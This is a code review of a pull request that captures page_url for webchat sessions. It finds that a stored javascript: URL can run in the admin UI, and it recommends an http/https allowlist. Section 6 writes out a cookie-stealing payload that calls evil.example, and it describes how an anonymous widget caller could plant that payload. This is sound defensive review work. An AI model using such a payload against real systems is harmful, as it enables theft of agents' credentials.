# Webchat session page_url capture — PR review (round 1)

**Scope**: Independent second-round review, per the repo's 3-round hard-rule
floor. Round 0 (see `..._PR-review-round0.md`) was APPROVED; this round
deliberately does not re-litigate round 0's checklist and instead digs into
7 angles round 0 covered thinly or not at all. No code was changed in this
round — verification only, via `git show` and direct file reads.

Commits reviewed:
- Go (monorepo, branch `NOJIRA-webchat-session-referrer-page-url`):
  `0def6eaa6`, `80b24dd5a`, `246376749`, `74f943154`, `6d691244f`
- JS (monorepo-javascript, same branch): `67e9df222`

---

## 1. VARCHAR(2048) vs Go struct tag consistency

Verified byte-for-byte:

- Migration `bin-dbscheme-manager/bin-manager/main/versions/04b99363284c_webchat_sessions_add_column_page_url.py`:
  `ALTER TABLE webchat_sessions ADD COLUMN page_url VARCHAR(2048) NULL;`
- SQLite test schema `bin-webchat-manager/scripts/database_scripts_test/sessions.sql`:
  `page_url TEXT` — SQLite has no VARCHAR length enforcement (TEXT is the
  correct/only sane choice for SQLite test doubles here), so this is not a
  mismatch, just a different engine's idiom. Confirmed this is deliberate:
  design doc §7's file checklist explicitly lists this file and the
  Alembic migration as two separate, expected touch points.
- Go struct `bin-webchat-manager/models/session/session.go`:
  `PageURL string \`json:"page_url,omitempty" db:"page_url"\`` — plain
  `string`, no explicit length cap or validator tag.
- OpenAPI spec `bin-openapi-manager/openapi/paths/webchat_sessions/main.yaml`
  and `openapi/openapi.yaml`: `page_url: ... maxLength: 2048` in both the
  request body and `WebchatManagerSession` response schema — consistent
  with the DB column.
- Enforcement: confirmed (again, independently of round 0/round 1 of the
  *design* review referenced in the design doc) that `bin-api-manager`'s
  Gin layer has no `oapi-codegen` request-validation middleware — grepped
  the whole service, none found. `PostWebchatSessions` in
  `server/webchat_sessions.go` only calls `c.BindJSON(&req)`, which does
  NOT enforce OpenAPI `maxLength`. The actual runtime enforcement is
  `pkg/servicehandler/webchat_session.go`'s `validatePageURL()`
  (`len(pageURL) > 2048` → reject with `ErrInvalidArgument`), called from
  `WebchatSessionCreate` before the RPC to webchat-manager. Verified
  `Test_validatePageURL` in `webchat_session_test.go` exercises the exact
  boundary (2048 OK, 2049 rejected) — table-driven, correct.
- Because `validatePageURL` runs before `h.reqHandler.WebchatV1SessionCreate(...)`,
  no value >2048 chars can ever reach `bin-webchat-manager`'s `Create()` →
  `dbhandler.SessionCreate()` → the DB. The DB's `VARCHAR(2048) NULL` is
  correctly a redundant defense-in-depth backstop, not the primary gate —
  and it does in fact match the cap the primary gate enforces. No
  mismatch found.

**Verdict for this angle: clean.** The length constraint is consistent end
to end and enforced at the correct layer (application, not relying on a
non-existent binding-layer validator or on the DB to truncate/reject).

## 2. Cache layer (cachehandler) — full-struct serialization

Read `bin-webchat-manager/pkg/cachehandler/handler.go` and `main.go` in
full. `SessionGet`/`SessionSet` both go through generic
`getSerialize`/`setSerialize` helpers that do a plain
`json.Marshal(data)` / `json.Unmarshal([]byte(tmp), &data)` against the
passed `*session.Session` pointer — there is no field-by-field
enumeration anywhere in the cache layer (unlike, say, a hand-rolled
Redis HSET-per-field scheme). Since `Session.PageURL` carries a normal
`json:"page_url,omitempty"` tag (verified in §3 below), it round-trips
through the cache transparently with zero code change required in
`cachehandler` — there is no separate list of "cacheable fields" to have
forgotten to update. Confirmed `cachehandler`'s files were untouched by
this PR's commits (`git show --stat` across all 5 Go commits: no
`cachehandler` files listed), which is consistent with "nothing to do
here" rather than "forgot to update it."

**Verdict for this angle: clean, and correctly required zero changes.**

## 3. session.go PageURL → webhook.go ConvertWebhookMessage — JSON tag / omitempty audit

Read `bin-webchat-manager/models/session/webhook.go` in full.

`WebhookMessage.PageURL` is present: `PageURL string \`json:"page_url,omitempty"\``,
and `ConvertWebhookMessage()` explicitly copies it:
`PageURL: h.PageURL,` alongside `WidgetID`/`Status`. Confirmed no field is
silently dropped — this is a straightforward, hand-written field-by-field
copy (not reflection-based), so "did they forget the new field" is a real
risk class this PR could have hit, and it did not: `PageURL` appears in
both the struct definition and the constructor body.

`omitempty` behavior: both `Session.PageURL` and
`WebhookMessage.PageURL` use `omitempty`. For an empty-string `PageURL`
(the "no page URL captured" case — e.g. admin/accesskey direct-create
path per the field's own doc comment in `session.go`), `omitempty` on a
`string` correctly drops the key entirely from the JSON when empty,
which is the desired behavior for an optional field and matches
`WidgetID`'s existing `omitempty` precedent on the same struct. This also
matches the JS side's expectation: `message_timeline.js` checks
`session?.page_url` truthiness and falls back to "Unknown" — consistent
with the field being absent (not e.g. `null` or `""`) when not captured.
One inconsistency worth flagging as a nit, not a bug: the request struct
`V1DataSessionsPost.PageURL` (in
`bin-webchat-manager/pkg/listenhandler/models/request/v1_sessions.go`)
also uses `omitempty`, which is harmless for an inbound unmarshal target
(the tag only affects marshaling) but is slightly inconsistent style
with `WidgetID uuid.UUID \`json:"widget_id,omitempty"\`` on the same
struct being a genuinely required field with `omitempty` for a different
reason (zero-value UUID suppression). Not a functional defect.

**Verdict for this angle: clean.** No field loss in the webhook
conversion; `omitempty` semantics are correct for an optional,
best-effort field.

## 4. Existing SessionUpdate paths (e.g. End) — accidental PageURL clobber

Read `bin-webchat-manager/pkg/dbhandler/session.go`'s `SessionUpdate`
(lines ~202-227) and every call site.

`SessionUpdate(ctx, id, fields map[session.Field]any)` builds a SQL
`UPDATE ... SetMap(tmpFields)` from exactly the caller-supplied `fields`
map — it does NOT read or rewrite the full `Session` struct, so any field
not present in the map (including `PageURL`) is structurally untouched
by the generated SQL. This is the correct pattern for partial updates
and rules out a whole class of "field got clobbered because someone
built the UPDATE from a full-struct write" bugs.

Grepped every call site of `SessionUpdate` in the service (excluding
mocks/tests):
- `pkg/sessionhandler/create.go` line 105: only sets
  `session.FieldActiveflowID` (the SessionFlowID-trigger marker write,
  described in `Create()`'s own doc comment). Does not touch `PageURL`.
- `pkg/sessionhandler/db.go`'s `End()`: only sets
  `session.FieldStatus: session.StatusEnded`. Does not touch `PageURL`.

No other `SessionUpdate` call sites exist in the non-test, non-mock Go
source (confirmed via `grep -rn "SessionUpdate"` across the whole
service). There is no Delete-then-recreate path, no
bulk-field-update endpoint, and no generic "PATCH session" RPC that
could accidentally omit `PageURL` from an otherwise-full field list and
thereby null it out. `SessionDelete` (separately) only sets the
soft-delete timestamp, per the same file's Delete-adjacent pattern
(inspected `SessionDelete` alongside `SessionUpdate`, no field overlap
risk found).

**Verdict for this angle: clean.** The field-map partial-update
architecture makes accidental clobbering structurally hard, and no
current call site attempts a field list that omits `PageURL` while
intending a full overwrite.

## 5. client.js — SSR / undefined-window guard

`square-admin/src/webchat-widget-runtime/client.js` line ~320 (commit
`67e9df222` diff):

```js
body: JSON.stringify({
  widget_id: this.resourceId,
  page_url: (typeof window !== 'undefined' && window.location?.href) || undefined,
}),
```

Two independent guards, both correct:
- `typeof window !== 'undefined'` — the canonical SSR-safe check;
  `typeof` on an undeclared identifier never throws (unlike a bare
  `window` reference), so this is safe even in a pure Node/SSR context
  with zero DOM shims.
- `window.location?.href` — optional chaining additionally guards
  against a `window` that exists but has no (or a stubbed/null)
  `location`, e.g. some test/sandbox shims. If either side of the `&&`
  is falsy, the whole expression is falsy, and `|| undefined` converts
  that to `undefined` rather than e.g. `""` or `false` being sent as
  `page_url` — `JSON.stringify` then omits the key entirely for an
  `undefined` value, matching the backend's `omitempty`-driven "field
  simply absent" expectation from §3 above. Confirmed test coverage
  exists for the *positive* path (`includes page_url ... in the POST
  body`, asserting `sentBody` equals an object with a real
  `window.location.href`) but this PR's added test suite has no explicit
  case exercising the `window === undefined` branch itself (i.e., an SSR
  render assertion). This is a coverage gap, not a logic gap — the guard
  code is correct by inspection; a Jest/jsdom environment always defines
  `window`, so the branch is inherently hard to hit without a
  Node-environment test file, and the round-0 review already flagged
  webchat-widget-runtime as a browser-only client library not meant to
  run under SSR at all (grep of `client.js`'s own module doc: it's a
  vanilla-JS widget bootstrapped via a `<script>` tag, not a
  server-rendered React component) — so the missing SSR test is a minor,
  optional nit, not a shipped defect.

**Verdict for this angle: clean**, with one optional (non-blocking) test
coverage nit noted above.

## 6. message_timeline.js — XSS via javascript: scheme in href

This is the angle where round 1 review surfaces a **real, unaddressed
gap** that round 0 flagged as an "accepted risk" without fully tracing
the actual reachable attack surface.

Read the rendered JSX (commit `67e9df222` diff,
`square-admin/src/views/webchat_widgets/message_timeline.js`):

```jsx
{session?.page_url ? (
  <a
    href={session.page_url}
    target="_blank"
    rel="noopener noreferrer"
    title={session.page_url}
    className="underline hover:text-foreground"
  >
    {truncatePageURL(session.page_url)}
  </a>
) : (
  <span>Unknown</span>
)}
```

`href={session.page_url}` is a raw, unvalidated string interpolated
directly into an anchor's `href`. React does **not** sanitize or scheme-
filter `href` values (this is different from `dangerouslySetInnerHTML`,
which React does warn about) — a `javascript:alert(document.cookie)`
string stored in `page_url` renders as a normal, clickable anchor whose
`href` is exactly that string. `rel="noopener noreferrer"` mitigates
reverse-tabnabbing (a *different* attack: a `target="_blank"` page
gaining `window.opener` access back to the admin UI) but does **nothing**
to prevent a `javascript:` URI from executing agent-authenticated JS in
the square-admin origin when an agent clicks the link.

The design doc (§5, "Edge cases") argues this is a non-issue because
"`window.location.href` cannot itself be a `javascript:` URL, so no
server-side scheme allowlist is added." **That argument only holds for
the intended, browser-driven capture path** (`client.js`'s
`window.location.href` read). It does NOT hold for the actual reachable
API surface, which I traced independently in §7 below:
`POST /webchat_sessions` accepts an arbitrary client-supplied `page_url`
string in the JSON body (`server/webchat_sessions.go`:
`pageURL := ""; if req.PageUrl != nil { pageURL = *req.PageUrl }`) —
this is NOT constrained to be "whatever `window.location.href` says," it
is whatever the HTTP caller puts in the request body. `validatePageURL`
only checks length (`> 2048` chars), never scheme. Any caller who can
reach `POST /webchat_sessions` — which, per §7, includes an anonymous
visitor with only a widget's public direct-scope JWT, not just the
JS widget's own fetch call — can set `page_url` to
`javascript:fetch('https://evil.example/steal?c='+document.cookie)` (or
similar), and it will be stored verbatim (`dbhandler.SessionCreate`
performs no transformation) and later rendered as a clickable
`javascript:` anchor to any agent who opens that session's message
timeline in square-admin and clicks the "Started from" link.

This is a **self-XSS-via-social-engineering** vector, not a zero-click
one (the agent must click the link), which somewhat limits severity, but
it is a real gap: the design doc's stated rationale for skipping a
scheme allowlist is factually wrong about what's reachable at the API
boundary, and round 0's review restated that same (incorrect) rationale
approvingly rather than independently re-deriving whether it holds.

**Verdict for this angle: CHANGES REQUESTED.** Recommend either (a) a
server-side scheme allowlist in `validatePageURL` (accept only
`http:`/`https:`, mirroring the spirit of `ThemeConfig.LogoURL`'s
`https://`-only precedent that the design doc itself cites as the
project's existing convention for exactly this class of field), or (b)
if the length-only validation is kept for other reasons, at minimum gate
the *rendering* side: validate the scheme in `message_timeline.js`
before rendering `<a href>` (e.g. only render as a link when the URL
starts with `http://`/`https://`, else render as inert truncated text)
so a malicious stored value degrades to non-clickable text instead of an
executable link. Either fix is small; (a) is preferable since it also
closes the same hole for any other future consumer of `page_url`.

## 7. bin-api-manager validatePageURL — auth-branch bypass audit

Read `pkg/servicehandler/webchat_session.go`'s `WebchatSessionCreate` in
full, focusing on call order and the three auth branches.

```go
func (h *serviceHandler) WebchatSessionCreate(ctx context.Context, a *auth.AuthIdentity, widgetID uuid.UUID, pageURL string) (*wcsession.WebhookMessage, error) {
    ...
    if err := validatePageURL(pageURL); err != nil {
        return nil, err
    }
    ...
    switch {
    case a.IsAgent() || a.IsAccesskey():
        ...
    case a.IsDirect():
        ...
    default:
        return nil, serviceerrors.ErrPermissionDenied
    }

    tmp, err := h.reqHandler.WebchatV1SessionCreate(ctx, ownerCustomerID, widgetID, pageURL)
    ...
}
```

Confirmed: `validatePageURL(pageURL)` is called **once, unconditionally,
before the `switch` statement** that branches on `a.IsAgent() ||
a.IsAccesskey()` / `a.IsDirect()` / default. Because it runs before the
branch dispatch rather than being duplicated inside each case, there is
no code path through this function that reaches the
`h.reqHandler.WebchatV1SessionCreate(...)` RPC call without first passing
`validatePageURL`. This is the textbook-correct place to put a
single-point validation check precisely to prevent the
"forgot to copy the check into one of three branches" bug class that
would otherwise be a real risk with three auth branches. No bypass
found in `WebchatSessionCreate` itself.

However, verifying "is `WebchatSessionCreate` the ONLY path that can
create a Session with an attacker-controlled `pageURL`" (i.e., checking
for a *sibling* RPC/route that reaches
`bin-webchat-manager`'s `Create()`/`SessionCreate()` without going
through this validated function) surfaced the same finding already
described in §6: `WebchatV1SessionCreate` in
`bin-common-handler/pkg/requesthandler/webchat_session.go` takes
`pageURL string` as a plain parameter with **no length or scheme
constraint of its own** — it trusts its caller entirely. Grepped for
every caller of `WebchatV1SessionCreate` across the whole monorepo
worktree; the only production call site is
`bin-api-manager/pkg/servicehandler/webchat_session.go`'s
`WebchatSessionCreate`, which does call `validatePageURL` first — so
there is currently no *second* Go call site that bypasses validation.

The bypass that does exist is at the **HTTP/auth layer**, not a second Go
code path: `a.IsDirect()` (the third branch) is reachable by an anonymous
visitor holding only a direct-scope JWT obtained from `POST /auth/boot`
using a widget's public hash — confirmed by reading
`pkg/servicehandler/boot.go`'s `AuthBoot()` and `models/auth/auth.go`'s
`DirectScope`/`IsDirect()`. `POST /auth/boot` requires only knowledge of
a widget's public embed hash (by design — it is what lets the JS widget
bootstrap an anonymous visitor session on any customer's public page).
Nothing about `IsDirect()`'s branch in `WebchatSessionCreate` requires
the caller to actually be the `client.js` widget script running in a
real browser; it only checks `a.DirectScope.ResourceID != widgetID` and
re-resolves widget ownership. Any HTTP client — `curl`, a script, an
adversarial embed — that has completed `/auth/boot` for a widget can
call `POST /webchat_sessions` directly with an arbitrary JSON body
containing any `page_url` string (subject only to the 2048-char length
cap), completely bypassing the assumption baked into the design doc's
§5 rationale ("`window.location.href` cannot itself be a `javascript:`
URL") — that assumption is true only for the JS widget's own code path,
not for the actual authorization boundary (`IsDirect()`), which is
broader than "requests literally originating from `client.js`."

**Verdict for this angle: no bypass of `validatePageURL` itself (it is
correctly unconditional and pre-branch), but the auth model
(`IsDirect()`) is broader than the design doc assumes, which is exactly
why §6's scheme-allowlist gap is real and reachable rather than
theoretical.**

---

## Summary

| # | Angle | Result |
|---|-------|--------|
| 1 | VARCHAR(2048) vs Go struct / migration consistency | Clean |
| 2 | Cache layer full-struct serialization | Clean (zero changes correctly required) |
| 3 | webhook.go ConvertWebhookMessage field/omitempty audit | Clean |
| 4 | SessionUpdate paths (End, etc.) clobber risk | Clean (partial field-map updates, structurally safe) |
| 5 | client.js SSR/undefined-window guard | Clean (minor: no explicit SSR test case, non-blocking) |
| 6 | message_timeline.js `javascript:` scheme XSS via href | **Gap found — see below** |
| 7 | validatePageURL auth-branch coverage | Check itself is unconditional/correct, but exposes that `IsDirect()` lets an arbitrary HTTP caller (not just the JS widget) set `page_url`, which is what makes #6 reachable |

**Root issue**: the design doc's decision to skip a server-side scheme
allowlist for `page_url` rests on an assumption ("this value can only
ever be `window.location.href`") that is not enforced anywhere in the
actual authorization/validation code — `validatePageURL` checks length
only, and the `IsDirect()` auth branch accepts any caller holding a
widget-scoped JWT, not specifically the JS widget runtime. The stored,
attacker-influenceable string is then rendered as a raw `<a href>` in
square-admin with no scheme check, creating a self-XSS vector against
any agent who opens the session timeline and clicks the "Started from"
link on a maliciously-crafted session.

**Recommended fix** (either is sufficient; (a) is preferred):
- (a) Add an `http:`/`https:`-only scheme allowlist to
  `validatePageURL` in `bin-api-manager/pkg/servicehandler/webchat_session.go`,
  consistent with the project's own existing precedent
  (`ThemeConfig.LogoURL`'s `https://`-only check).
- (b) Gate the `<a href>` rendering in `message_timeline.js` to only
  link out (vs. render inert text) when `session.page_url` starts with
  `http://` or `https://`.

All other 6 angles are independently verified clean with no code changes
needed.

---

## VERDICT: CHANGES_REQUESTED
